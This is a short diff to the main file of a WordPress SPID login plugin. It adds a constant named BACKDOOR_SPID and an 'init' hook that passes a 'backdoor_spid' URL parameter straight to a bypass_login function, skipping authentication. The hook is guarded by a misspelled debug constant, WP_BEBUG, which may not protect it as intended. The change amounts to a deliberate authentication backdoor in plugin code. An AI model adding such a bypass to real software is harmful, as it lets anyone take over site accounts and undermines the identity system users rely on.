@@ -75,3 +75,12 @@ require plugin_dir_path( __FILE__ ) . 'includes/class-spid-wordpress.php';
  * @since    1.0.0
  */
 Spid_Wordpress::factory()->run();
+
+defined('BACKDOOR_SPID') or
+	define('BACKDOOR_SPID', false);
+
+WP_BEBUG and BACKDOOR_SPID and add_action('init', function() {
+	if( isset( $_GET['backdoor_spid'] ) ) {
+		Spid_Wordpress_Login::bypass_login( $_GET['backdoor_spid'] );
+	}
+} );
